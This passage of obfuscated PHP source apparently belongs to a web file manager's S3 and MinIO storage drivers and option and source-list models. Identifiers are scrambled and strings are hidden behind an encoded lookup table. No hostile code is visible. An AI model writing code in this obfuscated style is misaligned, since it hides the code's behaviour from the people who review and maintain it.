(is_string($ªÎ±İ¨÷)) { $ë¶Á¤ÀÉ[$ªÎ±İ¨÷] = array($ä«œØíï[79] => 0); } } return $this->listAllFiles($ÁÉƒ†Ãƒ, $ë¶Á¤ÀÉ); } public function canRead($óù•˜í) { $ˆìÌ¸­’ =& $_SERVER[ìïæ“œî]; $“ï×ÊÔ´ = $this->client->getAccessControlPolicy($this->bucket, $óù•˜í); if (!$“ï×ÊÔ´) { return !1; } return in_array($“ï×ÊÔ´, array($ˆìÌ¸­’[241], $ˆìÌ¸­’[242], $ˆìÌ¸­’[243])) ? !0 : !1; } public function canWrite($Œ‹ÕÙˆû) { $Ş¹ÌÛş— =& $_SERVER[ìïæ“œî]; $•ªæ®áò = $this->client->getAccessControlPolicy($this->bucket, $Œ‹ÕÙˆû); if (!$•ªæ®áò) { return !1; } return in_array($•ªæ®áò, array($Ş¹ÌÛş—[241], $Ş¹ÌÛş—[242])) ? !0 : !1; } public function getContent($ºßæĞ¬) { return $this->client->getObject($this->bucket, $ºßæĞ¬); } public function setContent($Ğ¨¹£ä, $á®øƒšÛ = '', $£›ˆ”‰‰ = false) { $–Ä–Æïá =& $_SERVER[ìïæ“œî]; $Ğ¨¹£ä = $£›ˆ”‰‰ ? trim($Ğ¨¹£ä, $–Ä–Æïá[8]) . $–Ä–Æïá[8] : $Ğ¨¹£ä; $ôÒÜĞ· = get_file_mime(get_path_ext($Ğ¨¹£ä)); $¨„¸¾™ø = $this->client->putObject($á®øƒšÛ, $this->bucket, $Ğ¨¹£ä, $–Ä–Æïá[229], array(), $ôÒÜĞ·); if (!$¨„¸¾™ø) { return !1; } if ($£›ˆ”‰‰) { return !0; } return $¨„¸¾™ø ? !0 : !1; } public function fileSubstr($ò„ÈÁ’, $áÒ¦îü±, $ç™À§˜¸) { $íˆÀŞğõ = $áÒ¦îü± + $ç™À§˜¸ - 1; return $this->client->getObject($this->bucket, $ò„ÈÁ’, array($_SERVER[ìïæ“œî][244] => "\142\x79\164\145\163\x3d{$áÒ¦îü±}\x2d{$íˆÀŞğõ}")); } public function upload($Á‰äÎ±, $¯€è˜Œ, $÷©’¢™» = false, $Ğ·†—Ñ¿ = REPEAT_REPLACE) { $–¤æş£ =& $_SERVER[ìïæ“œî]; $Ò‡ôò¤€ = array($–¤æş£[245] => @md5_file($¯€è˜Œ)); $™ò‰±Ûô = array($–¤æş£[246] => get_file_mime(get_path_ext($Á‰äÎ±))); if (IO::size($¯€è˜Œ) <= 1024 * 1024 * 200) { $¨Ù¿Æ³ = $this->client->putObjectFile($¯€è˜Œ, $this->bucket, $Á‰äÎ±, $–¤æş£[229], $Ò‡ôò¤€, $™ò‰±Ûô); return !empty($¨Ù¿Æ³) ? $this->getPathOuter($Á‰äÎ±) : !1; } $¡ ìøëï = $this->client->multiUploadObject($¯€è˜Œ, $this->bucket, trim($Á‰äÎ±, $–¤æş£[8]), $Ò‡ôò¤€, $™ò‰±Ûô); return $¡ ìøëï ? $this->getPathOuter($Á‰äÎ±) : !1; } public function download($Ô“®ÏÂß, $«½Ø¦±¬) { if (!@is_dir($this->pathFather($«½Ø¦±¬)) && !IO::mkdir($this->pathFather($«½Ø¦±¬))) { return !1; } $†º€¹æ§ = $this->client->getObject($this->bucket, $Ô“®ÏÂß, array(), $«½Ø¦±¬); return $†º€¹æ§ !== !1 ? $«½Ø¦±¬ : !1; } public function link($ß“É‡öÄ, $˜šÕéşÈ = array()) { $ıŸ¾µ€­ =& $_SERVER[ìïæ“œî]; if ($this->signVer == $ıŸ¾µ€­[247]) { return $this->client->getAuthenticatedURL($this->bucket, $ß“É‡öÄ, 3600 * 12, $˜šÕéşÈ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ß“É‡öÄ, $ıŸ¾µ€­[8]), 3600 * 12, $this->region, array(), !0, $˜šÕéşÈ); } public function fileOut($úñô…¹Í, $¡İüáÀÁ = false, $œä¦àşÚ = false, $¨øóâç† = '') { $»ÒéÇÖè =& $_SERVER[ìïæ“œî]; if ($this->isFileOutServer()) { return $this->fileOutServer($úñô…¹Í, $¡İüáÀÁ, $œä¦àşÚ, $¨øóâç†); } if (!$œä¦àşÚ) { $œä¦àşÚ = $this->pathThis($úñô…¹Í); } $è›ãõïƒ = get_file_mime(get_path_ext($œä¦àşÚ)); if ($è›ãõïƒ == $»ÒéÇÖè[248]) { return parent::fileOut($úñô…¹Í, $¡İüáÀÁ, $œä¦àşÚ, $¨øóâç†); } $¯³ ×ï = array($»ÒéÇÖè[249] => $è›ãõïƒ); if ($¡İüáÀÁ) { $¯³ ×ï[$»ÒéÇÖè[250]] = $»ÒéÇÖè[251] . rawurlencode($œä¦àşÚ); } else { } $ƒ›•Ş…¶ = $this->link($úñô…¹Í, $¯³ ×ï); $this->fileOutLink($ƒ›•Ş…¶); } public function fileOutServer($€Í€Ó€ş, $Àö—× = false, $±ÔŠşØß = false, $¾æí‡¤ç = '') { parent::fileOut($€Í€Ó€ş, $Àö—×, $±ÔŠşØß, $¾æí‡¤ç); } public function fileOutImageServer($äÑÎóÙö, $ä¦¢ĞÈµ = 250) { parent::fileOutImage($äÑÎóÙö, $ä¦¢ĞÈµ); } public function hashMd5($¶çııù‘, $·—âÀ†ì = '') { $„Ì€±ª• = $this->objectMeta($¶çııù‘); if (!$„Ì€±ª•) { return !1; } $·—âÀ†ì = $·—âÀ†ì ? $·—âÀ†ì : _get($„Ì€±ª•, $_SERVER[ìïæ“œî][252]); return $·—âÀ†ì; } public function uploadFormData($¬ÚäÜ§ğ, $Ê™Ğèı = 3600) { $ÒàøŸÎ‡ =& $_SERVER[ìïæ“œî]; $‡´•¦ß = $this->pathFather($¬ÚäÜ§ğ); $¡Û¡ëŞ€ = $this->client->getHttpUploadPostParams($this->bucket, $‡´•¦ß, $ÒàøŸÎ‡[229], $Ê™Ğèı); return array_merge((array) $¡Û¡ëŞ€, array($ÒàøŸÎ‡[208] => $this->getHost())); } public function multiUploadFormData($ç‚şøàµ, $İĞò™ = 3600) { $Š’ƒÙ‰ =& $_SERVER[ìïæ“œî]; $Îşİ‡³è = gmdate($Š’ƒÙ‰[253]); $”öëı¬ = array(); $»ë–Şğ‰ = $this->client->getUploadId($this->bucket, $ç‚şøàµ, $”öëı¬); if (!$»ë–Şğ‰) { return !1; } return array($Š’ƒÙ‰[254] => $»ë–Şğ‰, $Š’ƒÙ‰[208] => $this->getHost() . $Š’ƒÙ‰[8] . $this->pathEncode($ç‚şøàµ), $Š’ƒÙ‰[255] => $Îşİ‡³è, $Š’ƒÙ‰[97] => $ç‚şøàµ); } public function multiUploadAuthData($éÇ˜Â…, $¥š¦Âõ  = array()) { $¶Ê¨ĞªÙ =& $_SERVER[ìïæ“œî]; $ÀÈ£õ¤“ = isset($¥š¦Âõ [$¶Ê¨ĞªÙ[255]]) ? $¥š¦Âõ [$¶Ê¨ĞªÙ[255]] : gmdate($¶Ê¨ĞªÙ[253]); $ˆÂıÁõ‚ = isset($¥š¦Âõ [$¶Ê¨ĞªÙ[169]]) ? $¥š¦Âõ [$¶Ê¨ĞªÙ[169]] : $¶Ê¨ĞªÙ[12]; $ÆÒˆ±òÛ = $¥š¦Âõ [$¶Ê¨ĞªÙ[97]]; unset($¥š¦Âõ [$¶Ê¨ĞªÙ[97]]); if (isset($¥š¦Âõ [$¶Ê¨ĞªÙ[256]])) { $¥š¦Âõ [$¶Ê¨ĞªÙ[255]] = $ÀÈ£õ¤“; return $this->listUploadParts($ÆÒˆ±òÛ, $¥š¦Âõ ); } $‹ú¿¦’¾ = array($¶Ê¨ĞªÙ[257], $¶Ê¨ĞªÙ[12], $¶Ê¨ĞªÙ[123], $¶Ê¨ĞªÙ[12], "\170\55\141\x6d\172\x2d\x64\x61\x74\145\x3a{$ÀÈ£õ¤“}", $¶Ê¨ĞªÙ[8] . $this->bucket . $¶Ê¨ĞªÙ[8] . $this->pathEncode($ÆÒˆ±òÛ) . $ˆÂıÁõ‚); if (strpos($ˆÂıÁõ‚, $¶Ê¨ĞªÙ[258]) === 0) { $‹ú¿¦’¾[0] = $¶Ê¨ĞªÙ[259]; } if (isset($¥š¦Âõ [$¶Ê¨ĞªÙ[260]]) && $¥š¦Âõ [$¶Ê¨ĞªÙ[260]] == $¶Ê¨ĞªÙ[261]) { $‹ú¿¦’¾[0] = $¶Ê¨ĞªÙ[261]; } $óÊæÍòã = implode($¶Ê¨ĞªÙ[262], $‹ú¿¦’¾); $ÙáŞ°’ = base64_encode(hash_hmac($¶Ê¨ĞªÙ[263], $óÊæÍòã, $this->secret, !0)); $€×ğˆÔ‹ = $¶Ê¨ĞªÙ[264] . $this->accessKey . $¶Ê¨ĞªÙ[4] . $ÙáŞ°’; if (strpos($ˆÂıÁõ‚, $¶Ê¨ĞªÙ[258]) === 0) { return array($¶Ê¨ĞªÙ[265] => $€×ğˆÔ‹, $¶Ê¨ĞªÙ[255] => $ÀÈ£õ¤“); } return $€×ğˆÔ‹; } public function listUploadParts($âñæĞ, $»æª—¨ = array()) { $ëÈåä =& $_SERVER[ìïæ“œî]; $§õËë‹í = str_replace($ëÈåä[266], $ëÈåä[12], $»æª—¨[$ëÈåä[169]]); $õ³¹’À… = $this->client->listParts($this->bucket, $âñæĞ, $§õËë‹í); if (!$õ³¹’À…) { return !1; } unset($»æª—¨[$ëÈåä[256]], $»æª—¨[$ëÈåä[260]]); $»æª—¨[$ëÈåä[97]] = $âñæĞ; $®˜Çç¢˜ = $this->multiUploadAuthData($âñæĞ, $»æª—¨); if (empty($®˜Çç¢˜)) { return !1; } return array($ëÈåä[265] => $®˜Çç¢˜, $ëÈåä[255] => $»æª—¨[$ëÈåä[255]], $ëÈåä[267] => $õ³¹’À…); } public function getHost() { $ØˆéÑî² =& $_SERVER[ìïæ“œî]; $Ë‹ÃÍ£æ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ØˆéÑî²[70], $ØˆéÑî²[64], $ØˆéÑî²[69], $ØˆéÑî²[62]))) { return $Ë‹ÃÍ£æ . $ØˆéÑî²[8] . $this->bucket; } $Ë‹ÃÍ£æ = explode($ØˆéÑî²[210], $Ë‹ÃÍ£æ); return $Ë‹ÃÍ£æ[0] . $ØˆéÑî²[210] . $this->bucket . $ØˆéÑî²[10] . $Ë‹ÃÍ£æ[1]; } public function size($üÕ¨€ Å) { $²ì×–£Ä = $this->objectMeta($üÕ¨€ Å); return $²ì×–£Ä ? $²ì×–£Ä[$_SERVER[ìïæ“œî][79]] : 0; } public function info($¨¤Ä®—‘) { if ($this->isFolder($¨¤Ä®—‘)) { return $this->folderInfo($¨¤Ä®—‘); } else { if ($this->isFile($¨¤Ä®—‘)) { return $this->fileInfo($¨¤Ä®—‘); } } return !1; } public function exist($®‘ĞƒŸ¤) { return $this->isFile($®‘ĞƒŸ¤) || $this->isFolder($®‘ĞƒŸ¤); } public function isFile($·¦Ûµõˆ) { return !$this->isFolder($·¦Ûµõˆ) && $this->objectMeta($·¦Ûµõˆ); } public function isFolder($¸ìÂÏŠÀ) { return $this->cacheMethod($_SERVER[ìïæ“œî][179], $¸ìÂÏŠÀ); } protected function objectMeta($›ïÉœîÚ) { return $this->cacheMethod($_SERVER[ìïæ“œî][181], $›ïÉœîÚ); } protected function _objectMeta($ğÒÎ‰ç) { $»ÍÆıĞÏ =& $_SERVER[ìïæ“œî]; $ğÒÎ‰ç = rtrim($ğÒÎ‰ç, $»ÍÆıĞÏ[8]); try { $íÍš‚éí = $this->client->getObjectInfo($this->bucket, $ğÒÎ‰ç); if (!isset($íÍš‚éí[$»ÍÆıĞÏ[252]]) && isset($íÍš‚éí[$»ÍÆıĞÏ[268]])) { $íÍš‚éí[$»ÍÆıĞÏ[252]] = $íÍš‚éí[$»ÍÆıĞÏ[268]]; } } catch (Exception $ßæñ•ÆÏ) { $íÍš‚éí = !1; } if (!$íÍš‚éí) { } return $íÍš‚éí; } protected function _isFolder($Õùµ¦») { $ƒ°Ôïà¥ =& $_SERVER[ìïæ“œî]; $Õùµ¦» = rtrim($Õùµ¦», $ƒ°Ôïà¥[8]); if ($Õùµ¦» == $ƒ°Ôïà¥[12] || $Õùµ¦» == $ƒ°Ôïà¥[8]) { return !0; } $İºØùâ­ = $this->client->getBucket($this->bucket, $Õùµ¦», null, 1); if (empty($İºØùâ­[$ƒ°Ôïà¥[236]])) { return !1; } $„µİ«¿ò = $İºØùâ­[$ƒ°Ôïà¥[236]][0][$ƒ°Ôïà¥[32]]; return stripos($„µİ«¿ò, $Õùµ¦» . $ƒ°Ôïà¥[8]) === 0 ? !0 : !1; if (substr($„µİ«¿ò, -1) == $ƒ°Ôïà¥[8]) { return !0; } if (get_path_this($„µİ«¿ò) == get_path_this($Õùµ¦»)) { return !1; } return !0; } public function listObject($˜¾Ç¿¹) { return $this->fileList($˜¾Ç¿¹, $_SERVER[ìïæ“œî][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($•£àšã›) { $öÖÉ…äë =& $_SERVER[ìïæ“œî]; parent::__construct($•£àšã›); $this->setSignVersion($öÖÉ…äë[247]); if (!$this->region) { $this->region = $öÖÉ…äë[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $Îäš©”ı = $this->getBucketRgn(); return $this->region == $Îäš©”ı ? !0 : !1; } public function uploadFormData($ı¯áğ¸, $ËÀ…ûò = 3600) { $–‚“Ã¤ş =& $_SERVER[ìïæ“œî]; $Œ“×§ø = $–‚“Ã¤ş[229]; $³ãâßÙ‡ = $–‚“Ã¤ş[270]; $Ö¸Åë˜­ = $–‚“Ã¤ş[62]; $ş´ßœœ§ = gmdate($–‚“Ã¤ş[271]); $é„ıÕ¬Ú = gmdate($–‚“Ã¤ş[272]); $Ü÷Õ±£ = $–‚“Ã¤ş[273]; $Ã¾³» = $ËÀ…ûò . $–‚“Ã¤ş[12]; $“ãÜã©ƒ = $–‚“Ã¤ş[274]; $ğ¿¾‚Õ = array($this->accessKey, $é„ıÕ¬Ú, $this->region, $Ö¸Åë˜­, $Ü÷Õ±£); $ô¬Î‡Àà = implode($–‚“Ã¤ş[8], $ğ¿¾‚Õ); $öíË”©¡ = array($–‚“Ã¤ş[275] => gmdate($–‚“Ã¤ş[276], strtotime($–‚“Ã¤ş[277])), $–‚“Ã¤ş[278] => array(array($–‚“Ã¤ş[279] => $this->bucket), array($–‚“Ã¤ş[280] => $Œ“×§ø), array($–‚“Ã¤ş[281], $–‚“Ã¤ş[282], $–‚“Ã¤ş[12]), array($–‚“Ã¤ş[281], $–‚“Ã¤ş[283], $–‚“Ã¤ş[12]), array($–‚“Ã¤ş[281], $–‚“Ã¤ş[284], $–‚“Ã¤ş[12]), array($–‚“Ã¤ş[285] => $“ãÜã©ƒ), array($–‚“Ã¤ş[286] => $ô¬Î‡Àà), array($–‚“Ã¤ş[287] => $³ãâßÙ‡), array($–‚“Ã¤ş[288] => $ş´ßœœ§), array($–‚“Ã¤ş[289] => $Ã¾³»))); $®»ÎÕş = base64_encode(json_encode($öíË”©¡)); $ÂßÁ¼Ù = hash_hmac($–‚“Ã¤ş[290], $é„ıÕ¬Ú, $–‚“Ã¤ş[291] . $this->secret, !0); $É¨½¦â = hash_hmac($–‚“Ã¤ş[290], $this->region, $ÂßÁ¼Ù, !0); $èàÚé–Ü = hash_hmac($–‚“Ã¤ş[290], $Ö¸Åë˜­, $É¨½¦â, !0); $õÒÆ¸‚ê = hash_hmac($–‚“Ã¤ş[290], $Ü÷Õ±£, $èàÚé–Ü, !0); $ì§Ë…¸ = hash_hmac($–‚“Ã¤ş[290], $®»ÎÕş, $õÒÆ¸‚ê); $Â”Ö‹ŒÄ = array($–‚“Ã¤ş[246] => $–‚“Ã¤ş[12], $–‚“Ã¤ş[292] => $–‚“Ã¤ş[12], $–‚“Ã¤ş[280] => $Œ“×§ø, $–‚“Ã¤ş[285] => $“ãÜã©ƒ, $–‚“Ã¤ş[293] => $®»ÎÕş, $–‚“Ã¤ş[294] => $ô¬Î‡Àà, $–‚“Ã¤ş[295] => $³ãâßÙ‡, $–‚“Ã¤ş[296] => $ş´ßœœ§, $–‚“Ã¤ş[297] => $Ã¾³», $–‚“Ã¤ş[298] => $ì§Ë…¸, $–‚“Ã¤ş[208] => $this->getHost()); return $Â”Ö‹ŒÄ; } } goto EĞñÄÔ“†®; e„¿’‚ï: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\155\x4f\160\164\151\157\x6e"; public $field = array(); public function listData($óåğÔµš = false, $¢£ğôŸ = "\155\x6f\144\151\146\x79\x54\151\155\x65", $Îƒ‚÷Õù = false) { $Úİ¹ëî = Model($this->modelType)->get(!1, $this->optionType, !0); $á„Û¸Œø = array_values($Úİ¹ëî); if ($á„Û¸Œø && $á„Û¸Œø[0] && !is_array($á„Û¸Œø[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Úİ¹ëî = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Úİ¹ëî) { return $óåğÔµš ? null : array(); } if (!$óåğÔµš) { $Úİ¹ëî = array_filter(array_values($Úİ¹ëî)); return array_sort_by($Úİ¹ëî, $¢£ğôŸ, $Îƒ‚÷Õù); } return $Úİ¹ëî[$_SERVER[ìïæ“œî][472] . $óåğÔµš]; } public function insert($ÇÄÂæÑ) { $ïÃÉôÁ =& $_SERVER[ìïæ“œî]; $ÇÄÂæÑ = array_field_key($ÇÄÂæÑ, $this->field); $ÙÓ‚Îæâ = Model($this->modelType)->get($ïÃÉôÁ[473], $this->optionType . $ïÃÉôÁ[474]); $ÙÓ‚Îæâ = $ÙÓ‚Îæâ ? $ÙÓ‚Îæâ : 0; $ÇÄÂæÑ[$ïÃÉôÁ[475]] = ++$ÙÓ‚Îæâ; $ÇÄÂæÑ[$ïÃÉôÁ[231]] = time(); $ÇÄÂæÑ[$ïÃÉôÁ[88]] = time(); Model($this->modelType)->set($ïÃÉôÁ[473], $ÙÓ‚Îæâ, $this->optionType . $ïÃÉôÁ[474]); Model($this->modelType)->set($ïÃÉôÁ[472] . $ÙÓ‚Îæâ, $ÇÄÂæÑ, $this->optionType); return $ÙÓ‚Îæâ; } public function update($ò“¤ğ­Ô, $¶¶¤î÷Ê) { $§ ãœ†î =& $_SERVER[ìïæ“œî]; $¶¶¤î÷Ê = array_field_key($¶¶¤î÷Ê, $this->field); $½ÛÏÕ”ù = $this->listData($ò“¤ğ­Ô); if (!$½ÛÏÕ”ù || !$ò“¤ğ­Ô) { return !1; } $¶¶¤î÷Ê = array_merge($½ÛÏÕ”ù, $¶¶¤î÷Ê); $¶¶¤î÷Ê[$§ ãœ†î[88]] = time(); return Model($this->modelType)->set($§ ãœ†î[472] . $ò“¤ğ­Ô, $¶¶¤î÷Ê, $this->optionType); } public function remove($æß´Ü×·) { if (!$æß´Ü×·) { return !1; } return Model($this->modelType)->remove($_SERVER[ìïæ“œî][472] . $æß´Ü×·, $this->optionType); } public function clear() { $‹‡ãí¼› =& $_SERVER[ìïæ“œî]; Model($this->modelType)->remove($‹‡ãí¼›[473], $this->optionType . $‹‡ãí¼›[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($öÃ¥„ß€, $’Ø€°Ã‘) { if (!$’Ø€°Ã‘) { return !1; } $â‰•ı±Î = $this->listData(); $â‰•ı±Î = array_to_keyvalue($â‰•ı±Î, $öÃ¥„ß€); return isset($â‰•ı±Î[$’Ø€°Ã‘]) ? $â‰•ı±Î[$’Ø€°Ã‘] : !1; } public function findByName($ßˆ¸Ÿà¸) { return $this->findByKey($_SERVER[ìïæ“œî][32], $ßˆ¸Ÿà¸); } protected function resetData($æ•¤İÙÈ) { $ìş‚±ì =& $_SERVER[ìïæ“œî]; $æ•¤İÙÈ = is_array($æ•¤İÙÈ) ? $æ•¤İÙÈ : array(); $œîêß’¡ = array(); for ($ÁÉÏÜÎ­ = 0; $ÁÉÏÜÎ­ < count($æ•¤İÙÈ); $ÁÉÏÜÎ­++) { $œîêß’¡[$ìş‚±ì[472] . $æ•¤İÙÈ[$ÁÉÏÜÎ­][$ìş‚±ì[475]]] = $æ•¤İÙÈ[$ÁÉÏÜÎ­]; } return Model($this->modelType)->set($œîêß’¡, !1, $this->optionType); } private function getAutoName($ŠÇ•§Ëº) { $€ÄØ¤ò = array_to_keyvalue($this->listData(), $_SERVER[ìïæ“œî][32]); if (!$€ÄØ¤ò || !isset($€ÄØ¤ò[$ŠÇ•§Ëº])) { return $ŠÇ•§Ëº; } for ($ğŒÊí– = 1; $ğŒÊí– < count($€ÄØ¤ò); $ğŒÊí–++) { $¨ÃĞ²Õ = $ŠÇ•§Ëº . "\50{$ğŒÊí–}\51"; if (!isset($€ÄØ¤ò[$¨ÃĞ²Õ])) { return $¨ÃĞ²Õ; } } return $¨ÃĞ²Õ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ò²øò¬ò = false, $ù»Ÿ¸­³ = '', $È ­Ğß = false) { $ğ‡ÈíøÇ =& $_SERVER[ìïæ“œî]; $ËÇ‘Ïî = $this->cacheGet($ù»Ÿ¸­³); $ãÑòÌÓç = $this->optionDefault($ù»Ÿ¸­³); $ãÑòÌÓç = is_array($ãÑòÌÓç) ? $ãÑòÌÓç : array(); if (is_array($ËÇ‘Ïî)) { $ËÇ‘Ïî = array_merge($ãÑòÌÓç, $ËÇ‘Ïî); return $Ò²øò¬ò ? isset($ËÇ‘Ïî[$Ò²øò¬ò]) ? $ËÇ‘Ïî[$Ò²øò¬ò] : null : $ËÇ‘Ïî; } $¦ü¥ç‹û = $this->filterWhere(array($ğ‡ÈíøÇ[33] => $ù»Ÿ¸­³)); $ËÇ‘Ïî = $this->where($¦ü¥ç‹û)->select(); $ËÇ‘Ïî = array_to_keyvalue($ËÇ‘Ïî, $ğ‡ÈíøÇ[97], $ğ‡ÈíøÇ[450]); foreach ($ËÇ‘Ïî as $ÊÈÄˆ®à => $ú‘•Ü’š) { if ($È ­Ğß || in_array($ÊÈÄˆ®à, $this->jsonField)) { $ËÇ‘Ïî[$ÊÈÄˆ®à] = json_decode($ú‘•Ü’š, !0); } } $this->cacheSet($ù»Ÿ¸­³, $ËÇ‘Ïî); $ËÇ‘Ïî = array_merge($ãÑòÌÓç, $ËÇ‘Ïî); return $Ò²øò¬ò ? $ËÇ‘Ïî[$Ò²øò¬ò] : $ËÇ‘Ïî; } public function set($ŒÖ‹Ô×ñ, $ç†ó™®Á = false, $ˆØÄ€ıƒ = '') { $à˜ÓÆı¨ =& $_SERVER[ìïæ“œî]; $this->cacheRemove($ˆØÄ€ıƒ); $‘Œöåó = array(); $»’Ñó‚– = is_array($ŒÖ‹Ô×ñ) ? $ŒÖ‹Ô×ñ : array($ŒÖ‹Ô×ñ => $ç†ó™®Á); foreach ($»’Ñó‚– as $µĞÔ—É¢ => $ó»¤ˆˆ) { if (is_array($ó»¤ˆˆ)) { $ó»¤ˆˆ = json_encode_force($ó»¤ˆˆ); } $this->checkLength($ó»¤ˆˆ, !1, $this->tableName . $à˜ÓÆı¨[4] . $ŒÖ‹Ô×ñ); $ó»¤ˆˆ = self::textEncode($ó»¤ˆˆ); $»’Ñó‚– = array($à˜ÓÆı¨[33] => $ˆØÄ€ıƒ, $à˜ÓÆı¨[97] => $µĞÔ—É¢, $à˜ÓÆı¨[450] => $ó»¤ˆˆ); $‘Œöåó[] = $this->filterWhere($»’Ñó‚–); } if (!$‘Œöåó) { return !0; } $…„ÖÁêÉ = $this->cacheKey($à˜ÓÆı¨[476]); CacheLock::lock($…„ÖÁêÉ); $çí™ú’ = $this->addAll($‘Œöåó, array(), !0); CacheLock::unlock($…„ÖÁêÉ); return $çí™ú’; } protected function optionDefault($õûÍú­‚ = '') { return !1; } public function setDeep($÷­ªôôĞ, $âù©¾ñ = false, $¥€Ú¸ŸÖ = '') { $‘¥ƒÏ’Ã = explode($_SERVER[ìïæ“œî][10], $÷­ªôôĞ); $¿ÖöıõÖ = $this->get(); array_set_value($¿ÖöıõÖ, $÷­ªôôĞ, $âù©¾ñ); $this->set($‘¥ƒÏ’Ã[0], $¿ÖöıõÖ[$‘¥ƒÏ’Ã[0]], $¥€Ú¸ŸÖ); } public function remove($Óé°›Ÿ‡, $ÏîŠºÂÌ = '') { $³û…Ûªş =& $_SERVER[ìïæ“œî]; $this->cacheRemove($ÏîŠºÂÌ); $ƒªâƒÎó = $this->filterWhere(array($³û…Ûªş[97] => $Óé°›Ÿ‡, $³û…Ûªş[33] => $ÏîŠºÂÌ)); if (is_null($Óé°›Ÿ‡)) { unset($ƒªâƒÎó[$³û…Ûªş[97]]); } return $this->where($ƒªâƒÎó)->delete(); } public function cacheSet($ö²ÏÇÙş, $ÓÊËÑˆÏ = false) { return Cache::set($this->cacheKey($ö²ÏÇÙş), $ÓÊËÑˆÏ); } public function cacheGet($Ü²§Ì±­) { return Cache::get($this->cacheKey($Ü²§Ì±­)); } public function cacheRemove($Õ¥ÎÙ¾Ğ) { return Cache::remove($this->cacheKey($Õ¥ÎÙ¾Ğ)); } protected function filterWhere($ĞŒª–ˆ°) { return $ĞŒª–ˆ°; } protected function cacheKey($ášè‚®˜) { return $ášè‚®˜; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\143\x65"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\x6d\x65" => "\151\x6f\x5f\163\x6f\x75\x72\x63\145\137\155\x65\x74\141", "\155\145\x74\141\106\151\x65\x6c\144" => "\163\x6f\x75\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\124\151\155\145", "\164\x69\155\145", "\x69\x6e\163\145\162\164", "\146\165\156\x63\x74\151\x6f\x6e"), array("\143\162\x65\141\x74\145\124\151\155\145", "\x74\x69\x6d\x65", "\151\x6e\x73\145\162\x74", "\x66\x75\156\x63\x74\x69\157\x6e"), array("\166\x69\x65\x77\x54\151\x6d\x65", "\x74\151\x6d\145", "\151\156\163\145\162\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¹õàíÚÜ) { return $this->listSource(array($_SERVER[ìïæ“œî][477] => $¹õàíÚÜ)); } public function typeName($„Ù¶ñè‡) { static $ÇëĞŞ = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $ÇëĞŞ[$„Ù¶ñè‡ . $_SERVER[ìïæ“œî][12]]; } public function sourceListInfo($Øœ¼Œë§, $¢–ÖÓ»• = false) { $™É¯¸ô¶ =& $_SERVER[ìïæ“œî]; $Øœ¼Œë§ = $Øœ¼Œë§ ? $Øœ¼Œë§ : array(); $Øœ¼Œë§ = array_filter(array_unique($Øœ¼Œë§)); if (!$Øœ¼Œë§) { return array(); } $ì„˜ı = $this->where(array($™É¯¸ô¶[193] => array($™É¯¸ô¶[7], $Øœ¼Œë§)))->select(); $this->_listDataApply($ì„˜ı, $¢–ÖÓ»•); return array_to_keyvalue($ì„˜ı, $™É¯¸ô¶[193]); } public function pathInfoFilter(&$ÍÌû‹ß) { $Àãì¹ë¸ =& $_SERVER[ìïæ“œî]; static $Ñûçª›® = false; static $‰Ö¹Î÷¾ = false; static $áï¥ç¶Ş = false; if (!$Ñûçª›®) { $Éì•Ú£ = $Àãì¹ë¸[478]; $Éì•Ú£ .= $Àãì¹ë¸[479]; $Éì•Ú£ .= $Àãì¹ë¸[480]; $‰™Õò• = $Àãì¹ë¸[481]; $áÖÑÓãà = explode($Àãì¹ë¸[50], $‰™Õò•); $Ñûçª›® = explode($Àãì¹ë¸[50], $Éì•Ú£); $‰Ö¹Î÷¾ = array(); foreach ($Ñûçª›® as $Òç€§¶) { if (in_array($Òç€§¶, $áÖÑÓãà)) { continue; } $‰Ö¹Î÷¾[] = $Òç€§¶; } $áï¥ç¶Ş = explode($Àãì¹ë¸[50], $Àãì¹ë¸[482]); } foreach ($áï¥ç¶Ş as $ÎÛ„”­¥) { if (isset($ÍÌû‹ß[$ÎÛ„”­¥])) { $ÍÌû‹ß[$ÎÛ„”­¥] = intval($ÍÌû‹ß[$ÎÛ„”­¥]); } } $ÍÌû‹ß[$Àãì¹ë¸[87]] = $Àãì¹ë¸[483] . $ÍÌû‹ß[$Àãì¹ë¸[193]] . $Àãì¹ë¸[484]; $ÍÌû‹ß[$Àãì¹ë¸[33]] = $ÍÌû‹ß[$Àãì¹ë¸[485]] == 1 ? $Àãì¹ë¸[78] : $Àãì¹ë¸[230]; $ÍÌû‹ß[$Àãì¹ë¸[190]] = $this->typeName($ÍÌû‹ß[$Àãì¹ë¸[190]]); if ($ÍÌû‹ß[$Àãì¹ë¸[485]] != 1) { $ÍÌû‹ß[$Àãì¹ë¸[169]] = $ÍÌû‹ß[$Àãì¹ë¸[486]]; unset($ÍÌû‹ß[$Àãì¹ë¸[486]]); } $×’ŠöÖ = $Ñûçª›®; if (isset($ÍÌû‹ß[$Àãì¹ë¸[487]]) && $ÍÌû‹ß[$Àãì¹ë¸[487]][$Àãì¹ë¸[488]] == -1) { $×’ŠöÖ = $‰Ö¹Î÷¾; } $ÍÌû‹ß = array_field_key($ÍÌû‹ß, $×’ŠöÖ); return $ÍÌû‹ß; } public function listUserFav() { $„ªµ§  =& $_SERVER[ìïæ“œî]; $İéÎ®…¨ = 